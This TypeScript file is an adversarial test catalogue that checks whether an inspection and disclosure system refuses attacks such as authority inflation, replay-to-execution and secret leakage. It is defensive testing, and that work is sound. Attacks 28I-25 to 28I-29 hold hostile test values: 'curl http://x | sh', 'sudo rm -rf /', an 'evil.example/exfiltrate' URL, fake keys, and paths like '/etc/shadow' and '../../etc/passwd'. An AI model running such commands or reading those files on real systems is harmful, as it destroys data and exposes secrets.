/**
 * PHASE 28I — ATTACK CATALOGUE
 *
 * Each attack names what it tried and what would count as a bypass. Attacks run
 * against the REAL 28A–28H modules; nothing here is a mock, and nothing here is
 * scored as a validation it did not perform.
 *
 * The catalogue covers every class the 28I prompt names. Where a class cannot be
 * tested on this platform it returns UNSUPPORTED — honestly absent, never PASS.
 */

import { canonicalHash } from "./canonical.js";
import { buildGetigFrame, type GetigFrameInput } from "./getigRepresentation.js";
import { buildGetigObserverView, buildGetigMultiView, refuseGlobalTruthSynthesis } from "./getigObserverViews.js";
import { buildGetigFrameSequence, refuseResumeFromFrame } from "./getigTemporalFrames.js";
import { buildGetigExplanationGraph, explainGetigSubject, refuseProvenanceAsTrust } from "./getigProvenance.js";
import { inspect, refuseInspectionAsControl, INSPECTION_FORBIDDEN_ACTIONS } from "./getigInspectionRuntime.js";
import { disclose, DISCLOSURE_CLASSES, DISCLOSURE_FORBIDDEN_FIELDS } from "./getigDisclosureGate.js";
import type { AttackInput } from "./getigAdversarialHarness.js";

// ── real fixtures built through the real builders ─────────────────────────────

const OBSERVER = {
  observerId: "obs-a",
  observerKind: "local_runtime",
  epochId: "e1",
  isGlobalTruth: false,
} as const;

/**
 * The fixture uses the REAL 28A entity/relation vocabulary, not invented kinds.
 * Building it through the real builder is the point: it proves 28I attacks
 * genuine Phase-28 output rather than a shape chosen to make attacks fail.
 */
const entity = (visibleId: string, kind: "tool_reference" | "runtime_node" | "agent", lifecycle: "observed" | "retired" | "quarantined", freshness: "current" | "stale") => ({
  visibleId,
  kind,
  label: visibleId,
  isRuntimeObject: false as const,
  grant: "none" as const,
  freshness,
  lifecycle,
  provenanceRefs: [],
  representsRuntimeId: null,
});

const FRAME_INPUT: GetigFrameInput = {
  frameId: "f1",
  observer: OBSERVER,
  epochId: "e1",
  asOfEpochMs: 1_700_000_000_000,
  sourceProjectionHash: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  entities: [
    entity("n1", "tool_reference", "observed", "current"),
    entity("n2", "runtime_node", "retired", "stale"),
    entity("n3", "agent", "quarantined", "current"),
  ],
  relations: [
    {
      relationId: "r1",
      kind: "observed_edge",
      fromVisibleId: "n1",
      toVisibleId: "n2",
      trust: "none" as const,
      provenanceRefs: [],
    },
  ],
};

const builtFrame = buildGetigFrame(FRAME_INPUT);
if (!builtFrame.ok) throw new Error(`28I fixture frame failed to build: ${builtFrame.refusal}`);
const FRAME = builtFrame.frame;

const viewDecision = buildGetigObserverView({
  viewId: "v1",
  observerId: "obs-a",
  observerKind: "local_runtime",
  runtimeId: "rt-a",
  epochId: "e1",
  frame: FRAME,
});
if (!viewDecision.ok) throw new Error(`28I fixture view failed to build: ${viewDecision.refusal}`);
const VIEW = viewDecision.view;

const BINDING = {
  frameId: VIEW.builtFromFrameId,
  observerId: VIEW.observerId,
  canonicalVisibleHash: VIEW.builtFromVisibleHash,
  viewHash: VIEW.viewHash,
};

const DISCLOSE_BIND = {
  frameId: "f1",
  observerId: "obs-a",
  canonicalVisibleHash: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
};

const SAFE_RECORD = { subjectVisibleId: "n1", lifecycle: "observed", factCount: 1 };

const seqDecision = buildGetigFrameSequence({
  sequenceId: "s1",
  observerId: "obs-a",
  epochId: "e1",
  orderingBasis: "observed_order",
  frames: [
    {
      frameId: "f0",
      asOfEpochMs: 1_699_999_999_000,
      canonicalVisibleHash: "a".repeat(64),
      sourceProjectionHash: "b".repeat(64),
      epochId: "e1",
      observer: { observerId: "obs-a" },
    },
    {
      frameId: "f1",
      asOfEpochMs: 1_700_000_000_000,
      canonicalVisibleHash: "c".repeat(64),
      sourceProjectionHash: "d".repeat(64),
      epochId: "e1",
      observer: { observerId: "obs-a" },
    },
  ],
});
if (!seqDecision.ok) throw new Error(`28I fixture sequence failed: ${seqDecision.refusal}`);
const SEQUENCE = seqDecision.sequence;

const graphDecision = buildGetigExplanationGraph({ graphId: "g1", frame: FRAME });
if (!graphDecision.ok) throw new Error(`28I fixture graph failed: ${graphDecision.refusal}`);
const GRAPH = graphDecision.graph;

const serialise = (v: unknown): string => {
  try {
    return JSON.stringify(v);
  } catch {
    return "<unserialisable>";
  }
};

const noBypass = (defence: "structural" | "refusal", observed: string) =>
  ({ bypassed: false, defence, observed }) as const;
const bypass = (observed: string) => ({ bypassed: true, observed }) as const;

// ── the catalogue ────────────────────────────────────────────────────────────

export const ATTACK_CATALOGUE: readonly AttackInput[] = [
  // ── authority inflation ───────────────────────────────────────────────────
  {
    attackId: "28I-01",
    category: "authority_inflation",
    description: "unknown -> trusted: an unstated subject must stay unknown, never known",
    run: () => {
      const d = buildGetigObserverView({
        viewId: "v2",
        observerId: "obs-a",
        observerKind: "local_runtime",
        runtimeId: "rt-a",
        epochId: "e1",
        frame: {
          ...FRAME,
          entities: [{ visibleId: "ghost", lifecycle: "unknown", freshness: "unknown" }],
        },
      });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      const fact = d.view.facts.find((f) => f.subjectVisibleId === "ghost");
      return fact?.knowledge === "known" || fact?.isGrant !== false
        ? bypass(`ghost knowledge=${fact?.knowledge} isGrant=${fact?.isGrant}`)
        : noBypass("structural", "unstated subject stays knowledge=unknown isGrant=false");
    },
  },
  {
    attackId: "28I-02",
    category: "authority_inflation",
    description: "claim -> grant: a view claiming authority must be refused",
    run: () => {
      const d = inspect({
        query: { kind: "inspect", operation: "inspect" },
        view: { ...VIEW, authority: "full" },
        binding: BINDING,
      });
      return d.ok ? bypass(`view claiming authority accepted: ${serialise(d)}`) : noBypass("structural", `refused: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-03",
    category: "authority_inflation",
    description: "observed edge -> admission: provenance must never confer trust",
    run: () => {
      const d = inspect({
        query: { kind: "trace_provenance", operation: "trace_provenance", subjectVisibleId: "n1" },
        graph: GRAPH,
        binding: BINDING,
      });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      const result = d.result as unknown as { hops: { confersTrust: boolean; confersAuthority: boolean }[] };
      return result.hops.some((h) => h.confersTrust || h.confersAuthority)
        ? bypass("a provenance hop conferred trust or authority")
        : noBypass("structural", "every hop confersTrust=false confersAuthority=false");
    },
  },
  {
    attackId: "28I-04",
    category: "authority_inflation",
    description: "route -> authorization: a route id must not become authority",
    run: () => {
      const d = refuseProvenanceAsTrust("rt1", "authorization");
      return d.confersAuthority !== false || d.confersTrust !== false || d.ok !== false
        ? bypass(`provenance accepted as authority: ${serialise(d)}`)
        : noBypass("structural", `refused: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-05",
    category: "authority_inflation",
    description: "forwarder -> origin: a route role must not be promoted to origin",
    run: () => {
      // 28F's relation vocabulary has no route relation at all, so a forged
      // "forwarded_to" edge is refused at the boundary rather than downgraded.
      const d = buildGetigExplanationGraph({
        graphId: "g2",
        frame: {
          ...FRAME,
          provenanceRecords: [{ provenanceId: "p1", kind: "route", label: "rt1" }],
        },
      });
      if (!d.ok) return noBypass("refusal", `forged route provenance refused: ${d.refusal}`);
      const fwd = d.graph.edges.find((e) => e.role === "origin");
      return fwd !== undefined && fwd.relation !== "has_role"
        ? bypass(`a forwarder claimed the origin role: ${serialise(fwd)}`)
        : noBypass("structural", "route role cannot be promoted to origin");
    },
  },
  {
    attackId: "28I-06",
    category: "authority_inflation",
    description: "local view -> global truth: synthesis must be impossible",
    run: () => {
      const d = refuseGlobalTruthSynthesis(["obs-a", "obs-b"], "consensus");
      return d.ok || d.isGlobalTruth !== false || d.winnerDeclared !== false || d.consensusAsserted !== false
        ? bypass(`global truth synthesised: ${serialise(d)}`)
        : noBypass("structural", "synthesis refused; cannot succeed under any input");
    },
  },

  // ── staleness erosion ─────────────────────────────────────────────────────
  {
    attackId: "28I-07",
    category: "staleness_erosion",
    description: "stale -> current: a fresher observation must not decide truth",
    run: () => {
      const d = buildGetigMultiView({ multiViewId: "m1", runtimeId: "rt-a", epochId: "e1", views: [VIEW] });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      const c = d.multiView.comparisons[0] as { freshnessDecidesNothing: boolean } | undefined;
      return c?.freshnessDecidesNothing === false
        ? bypass("a fresher account was treated as deciding truth")
        : noBypass("structural", "freshnessDecidesNothing=true; no winner declared");
    },
  },
  {
    attackId: "28I-08",
    category: "staleness_erosion",
    description: "stale frame resurrection: resume from an old frame must be refused",
    run: () => {
      const d = refuseResumeFromFrame("f0", 1_699_999_999_000);
      return d.ok || d.resumedRuntimeState !== false || d.restoredRuntimeState !== false
        ? bypass(`resume granted: ${serialise(d)}`)
        : noBypass("structural", "resume refused; replay is visual history only");
    },
  },

  // ── conflict suppression ──────────────────────────────────────────────────
  {
    attackId: "28I-09",
    category: "conflict_suppression",
    description: "conflict suppression: refuse to drop a supplied refusal record",
    run: () => {
      const d = buildGetigFrame({
        ...FRAME_INPUT,
        refusals: [
          {
            refusalId: "rr1",
            code: "refused_invalid_input",
            subjectVisibleId: "n1",
            explanation: "policy denied",
          },
        ],
      });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      const present = d.frame.refusals.some((r) => r.refusalId === "rr1");
      return !present ? bypass("a supplied refusal was dropped from the frame") : noBypass("structural", "refusal record preserved");
    },
  },
  {
    attackId: "28I-10",
    category: "conflict_suppression",
    description: "partition conflict suppression: a frame must never declare itself global truth",
    run: () => {
      // `isGlobalTruth` is typed `false` structurally, so a forged `true` is only
      // reachable through a cast — which is exactly the shape of a runtime
      // forgery, and exactly what the frame builder must reject.
      const d = buildGetigFrame({
        ...FRAME_INPUT,
        observer: { ...OBSERVER, isGlobalTruth: true } as unknown as typeof OBSERVER,
      });
      return d.ok ? bypass(`a frame claimed global truth: ${serialise(d.frame.observer)}`) : noBypass("structural", `refused: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-11",
    category: "conflict_suppression",
    description: "terminal resurrection: a retired fact must stay barred",
    run: () => {
      const d = buildGetigMultiView({ multiViewId: "m3", runtimeId: "rt-a", epochId: "e1", views: [VIEW] });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      const retired = d.multiView.views[0]?.facts.find((f) => f.subjectVisibleId === "n2");
      return retired?.isBarred !== true || d.multiView.terminalResurrected !== false
        ? bypass(`retired subject not barred: ${serialise(retired)}`)
        : noBypass("structural", "retired isBarred=true; terminalResurrected=false");
    },
  },

  // ── provenance tampering ──────────────────────────────────────────────────
  {
    attackId: "28I-12",
    category: "provenance_tampering",
    description: "provenance stripping: a subject with no provenance must surface as unknown",
    run: () => {
      const t = explainGetigSubject(GRAPH, "does-not-exist");
      return t.ok
        ? bypass(`an unknown subject produced a trace: ${serialise(t.trace)}`)
        : noBypass("structural", `refused: ${t.refusal}`);
    },
  },
  {
    attackId: "28I-13",
    category: "provenance_tampering",
    description: "provenance substitution: an explanation must never authorise",
    run: () => {
      const d = refuseProvenanceAsTrust("n1", "grant");
      return d.authorizesExecution !== false || d.confersAuthority !== false
        ? bypass(`explanation authorised something: ${serialise(d)}`)
        : noBypass("structural", "explanation carries authorizesExecution=false confersAuthority=false");
    },
  },

  // ── replay to execution ───────────────────────────────────────────────────
  {
    attackId: "28I-14",
    category: "replay_to_execution",
    description: "visual replay -> execution: timeline navigation must not resume",
    run: () => {
      const d = inspect({
        query: { kind: "timeline_navigate", operation: "timeline_navigate" },
        sequence: SEQUENCE,
        binding: BINDING,
      });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      const r = d.result as { resumesRuntimeState: boolean; restoresRuntimeState: boolean };
      return r.resumesRuntimeState || r.restoresRuntimeState
        ? bypass("timeline navigation resumed or restored runtime state")
        : noBypass("structural", "resumesRuntimeState=false restoresRuntimeState=false");
    },
  },
  {
    attackId: "28I-15",
    category: "replay_to_execution",
    description: "animation -> live execution: an executable-replay sequence must be refused",
    run: () => {
      const d = inspect({
        query: { kind: "timeline_navigate", operation: "timeline_navigate" },
        sequence: { ...SEQUENCE, replaySemantics: "executable_replay" },
        binding: BINDING,
      });
      return d.ok ? bypass(`executable-replay sequence accepted: ${serialise(d)}`) : noBypass("structural", `refused: ${d.refusal}`);
    },
  },

  // ── timeline / identity tampering ─────────────────────────────────────────
  {
    attackId: "28I-16",
    category: "timeline_tampering",
    description: "timeline tamper: an unknown ordering basis must not claim chronology",
    run: () => {
      const d = inspect({
        query: { kind: "timeline_navigate", operation: "timeline_navigate" },
        sequence: { ...SEQUENCE, orderingBasis: "unknown" },
        binding: BINDING,
      });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      return (d.result as { temporalOrderEstablished: boolean }).temporalOrderEstablished
        ? bypass("an unknown ordering basis still claimed a chronology")
        : noBypass("structural", "temporalOrderEstablished=false for unknown basis");
    },
  },
  {
    attackId: "28I-17",
    category: "identity_substitution",
    description: "frame hash mismatch: a result must not bind to a foreign view hash",
    run: () => {
      const d = inspect({
        query: { kind: "inspect", operation: "inspect" },
        view: VIEW,
        binding: { ...BINDING, viewHash: "f".repeat(64) },
      });
      return d.ok ? bypass("a result bound to a foreign view hash") : noBypass("structural", `refused: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-18",
    category: "identity_substitution",
    description: "canonicalization collision: key order must not change the hash",
    run: () => {
      const a = canonicalHash({ x: 1, y: [1, 2], z: "s" });
      const b = canonicalHash({ z: "s", y: [1, 2], x: 1 });
      const c = canonicalHash({ x: 1, y: [2, 1], z: "s" });
      if (a !== b) return bypass("key order changed the canonical hash");
      if (a === c) return bypass("array order was ignored by canonicalization");
      return noBypass("structural", "key order stable, array order significant");
    },
  },
  {
    attackId: "28I-19",
    category: "identity_substitution",
    description: "cross-epoch substitution: views from different epochs must not compare",
    run: () => {
      const b = buildGetigObserverView({
        viewId: "vb",
        observerId: "obs-b",
        observerKind: "local_runtime",
        runtimeId: "rt-a",
        epochId: "e2",
        frame: { ...FRAME, epochId: "e2", observer: { ...OBSERVER, observerId: "obs-b", epochId: "e2" } },
      });
      if (!b.ok) return noBypass("refusal", `refused: ${b.refusal}`);
      const d = buildGetigMultiView({ multiViewId: "m4", runtimeId: "rt-a", epochId: "e1", views: [VIEW, b.view] });
      return d.ok ? bypass(`a cross-epoch comparison was accepted: ${serialise(d)}`) : noBypass("refusal", `refused: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-20",
    category: "identity_substitution",
    description: "observer substitution: facts must not be mis-attributed",
    run: () => {
      const d = buildGetigObserverView({
        viewId: "v4",
        observerId: "obs-a",
        observerKind: "local_runtime",
        runtimeId: "rt-a",
        epochId: "e1",
        frame: { ...FRAME, observer: { ...OBSERVER, observerId: "obs-b" } },
      });
      return d.ok ? bypass(`facts mis-attributed: ${serialise(d)}`) : noBypass("structural", `refused: ${d.refusal}`);
    },
  },

  // ── inspection injection ──────────────────────────────────────────────────
  {
    attackId: "28I-21",
    category: "inspection_injection",
    description: "inspection action injection: every forbidden verb must be refused",
    run: () => {
      const accepted = INSPECTION_FORBIDDEN_ACTIONS.filter((action) =>
        inspect({ query: { kind: "inspect", operation: "inspect", [action]: true }, view: VIEW, binding: BINDING }).ok,
      );
      return accepted.length > 0
        ? bypass(`${accepted.length} forbidden actions accepted: ${accepted.join(", ")}`)
        : noBypass("structural", `all ${INSPECTION_FORBIDDEN_ACTIONS.length} forbidden actions refused`);
    },
  },
  {
    attackId: "28I-22",
    category: "inspection_injection",
    description: "visual selection -> mutation: a selection carrying a change must be refused",
    run: () => {
      const d = inspect({
        query: { kind: "select", operation: "select", subjectVisibleId: "n1", retire: true },
        view: VIEW,
        binding: BINDING,
      });
      return d.ok ? bypass("a selection carrying a mutation was accepted") : noBypass("structural", `refused: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-23",
    category: "inspection_injection",
    description: "inspection as control: the control refusal must never succeed",
    run: () => {
      const d = refuseInspectionAsControl("execute");
      return d.ok ? bypass("inspection granted a control action") : noBypass("structural", "refused; cannot succeed under any input");
    },
  },
  {
    attackId: "28I-24",
    category: "capability_union",
    description: "capability union: a view claiming several authorities at once must be refused",
    run: () => {
      const d = inspect({
        query: { kind: "inspect", operation: "inspect" },
        view: { ...VIEW, authority: "full", readOnly: false, isGlobalTruth: true },
        binding: BINDING,
      });
      return d.ok ? bypass(`a super-view was accepted: ${serialise(d)}`) : noBypass("structural", `refused: ${d.refusal}`);
    },
  },

  // ── disclosure leak ───────────────────────────────────────────────────────
  {
    attackId: "28I-25",
    category: "disclosure_leak",
    description: "secret/key leakage: a secret in a sanctioned field must be refused",
    run: () => {
      const secrets: [string, string][] = [
        ["frameId", "-----BEGIN RSA PRIVATE KEY-----MIIEow"],
        ["hashRef", "sk-live-abcdefghijklmnopqrstuvwx"],
        ["subjectVisibleId", "/root/.ssh/id_rsa"],
        ["fingerprint", "/home/user/private/notes.txt"],
        ["observerId", "https://evil.example/exfiltrate"],
      ];
      const leaked = secrets.filter(
        ([f, v]) => disclose({ ...DISCLOSE_BIND, records: [{ ...SAFE_RECORD, [f]: v }] }).ok,
      );
      return leaked.length > 0
        ? bypass(`leaked via: ${leaked.map(([f]) => f).join(", ")}`)
        : noBypass("structural", `all ${secrets.length} secret shapes refused`);
    },
  },
  {
    attackId: "28I-26",
    category: "disclosure_leak",
    description: "nested raw payload: forbidden material buried in nested structure must never be disclosed",
    run: () => {
      const payloads: Record<string, unknown>[] = [
        { meta: { inner: { privateKey: "-----BEGIN" } } },
        { items: [{ lifecycle: "observed" }, { password: "x" }] },
        { grid: [[{ token: "sk-x" }]] },
      ];
      const leaked = payloads.filter((p) => disclose({ ...DISCLOSE_BIND, records: [{ ...SAFE_RECORD, ...p }] }).ok);
      return leaked.length > 0
        ? bypass(`${leaked.length} nested payloads disclosed`)
        : noBypass("structural", `all ${payloads.length} nested payloads refused`);
    },
  },
  {
    attackId: "28I-27",
    category: "disclosure_leak",
    description: "every declared forbidden field name must be refused",
    run: () => {
      const leaked = DISCLOSURE_FORBIDDEN_FIELDS.filter((f) =>
        disclose({ ...DISCLOSE_BIND, records: [{ ...SAFE_RECORD, [f]: "x" }] }).ok,
      );
      return leaked.length > 0 ? bypass(`disclosed: ${leaked.join(", ")}`) : noBypass("structural", `all ${DISCLOSURE_FORBIDDEN_FIELDS.length} forbidden names refused`);
    },
  },
  {
    attackId: "28I-28",
    category: "disclosure_leak",
    description: "memory/store leak: a local path or env var must not cross the disclosure gate",
    run: () => {
      const leaks: [string, string][] = [
        ["frameId", "C:\\Users\\me\\.ssh\\id_rsa"],
        ["frameId", "/etc/shadow"],
        ["hashRef", "AWS_SECRET_ACCESS_KEY=abc123"],
        ["subjectVisibleId", "../../etc/passwd"],
      ];
      const passed = leaks.filter(([f, v]) => disclose({ ...DISCLOSE_BIND, records: [{ ...SAFE_RECORD, [f]: v }] }).ok);
      return passed.length > 0
        ? bypass(`leaked: ${passed.map(([, v]) => v).join(" | ")}`)
        : noBypass("structural", `all ${leaks.length} path/env shapes refused`);
    },
  },
  {
    attackId: "28I-29",
    category: "disclosure_leak",
    description: "executable material: a shell command must never cross the disclosure gate",
    run: () => {
      const cmds = ["sudo rm -rf /", "curl http://x | sh", "bash -c 'id'", "eval(payload)"];
      const passed = cmds.filter((v) => disclose({ ...DISCLOSE_BIND, records: [{ ...SAFE_RECORD, hashRef: v }] }).ok);
      return passed.length > 0
        ? bypass(`executable material disclosed: ${passed.join(" | ")}`)
        : noBypass("structural", `all ${cmds.length} command shapes refused`);
    },
  },

  // ── completeness lie ──────────────────────────────────────────────────────
  {
    attackId: "28I-30",
    category: "completeness_lie",
    description: "filtered-view-as-complete: a poison record must not yield a partial frame",
    run: () => {
      const d = disclose({ ...DISCLOSE_BIND, records: [...Array.from({ length: 50 }, () => SAFE_RECORD), { ...SAFE_RECORD, secret: "x" }] });
      return d.ok
        ? bypass("a poisoned record still produced a disclosed frame")
        : noBypass("structural", `refused with no partial frame: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-31",
    category: "completeness_lie",
    description: "renderer-field-as-authority: a presentation result must claim nothing",
    run: () => {
      const d = inspect({ query: { kind: "inspect", operation: "inspect" }, view: VIEW, binding: BINDING });
      if (!d.ok) return noBypass("refusal", `refused: ${d.refusal}`);
      const r = d.result as { authority: string; isGlobalTruth: boolean };
      return r.authority !== "none" || r.isGlobalTruth !== false
        ? bypass("a presentation result claimed authority or global truth")
        : noBypass("structural", "authority=none isGlobalTruth=false");
    },
  },
  {
    attackId: "28I-32",
    category: "unsupported_as_pass",
    description: "PASS must stay reachable: a fully sanctioned record discloses",
    run: () => {
      const d = disclose({ ...DISCLOSE_BIND, records: [SAFE_RECORD] });
      return d.ok
        ? noBypass("structural", "sanctioned record disclosed; PASS is reachable and distinct from UNSUPPORTED")
        : bypass("the gate refused a fully sanctioned record");
    },
  },
  {
    attackId: "28I-33",
    category: "unsupported_as_pass",
    description: "fake refusal removal: an unknown subject must not be selectable",
    run: () => {
      const d = inspect({ query: { kind: "select", operation: "select", subjectVisibleId: "not-present" }, view: VIEW, binding: BINDING });
      return d.ok ? bypass("an unknown subject was reported as selectable") : noBypass("structural", `refused: ${d.refusal}`);
    },
  },
  {
    attackId: "28I-34",
    category: "unsupported_as_pass",
    description: "authority/controlPlane/readOnly must remain untamperable across every operation",
    run: () => {
      const ops = [
        { kind: "inspect", operation: "inspect" },
        { kind: "filter", operation: "filter", filterBase: "lifecycle", filterValue: "retired" },
        { kind: "timeline_navigate", operation: "timeline_navigate" },
        { kind: "trace_provenance", operation: "trace_provenance", subjectVisibleId: "n1" },
        { kind: "enumerate_refusals", operation: "enumerate_refusals_conflicts" },
      ] as const;
      const tampered = ops.filter((query) => {
        const d = inspect({ query: { ...query } as never, view: VIEW, sequence: SEQUENCE, graph: GRAPH, binding: BINDING });
        return d.ok && (d.authority !== "none" || d.readOnly !== true || d.mutatedCanonicalState !== false);
      });
      return tampered.length > 0
        ? bypass(`tamper accepted on: ${tampered.map((t) => t.operation).join(", ")}`)
        : noBypass("structural", `all ${ops.length} operations report authority=none readOnly=true mutated=false`);
    },
  },

  // ── disclosure integrity ──────────────────────────────────────────────────
  {
    attackId: "28I-35",
    category: "completeness_lie",
    description: "unknown fields must default-deny, including a near-miss spelling",
    run: () => {
      const unknowns = ["mystery", "widgetCount", "zzz", "lifecyle"];
      const passed = unknowns.filter((f) => disclose({ ...DISCLOSE_BIND, records: [{ ...SAFE_RECORD, [f]: 1 }] }).ok);
      return passed.length > 0
        ? bypass(`unknown fields disclosed: ${passed.join(", ")}`)
        : noBypass("structural", `all ${unknowns.length} unknown fields refused (default-deny)`);
    },
  },
  {
    attackId: "28I-36",
    category: "authority_inflation",
    description: "the allowlist and the forbidden list must be disjoint",
    run: () => {
      const allowed = new Set<string>(DISCLOSURE_CLASSES);
      const overlap = DISCLOSURE_FORBIDDEN_FIELDS.filter((f) => allowed.has(f.toLowerCase()));
      return overlap.length > 0
        ? bypass(`allowlist/forbidden overlap: ${overlap.join(", ")}`)
        : noBypass("structural", "allowlist and forbidden list are disjoint");
    },
  },
];
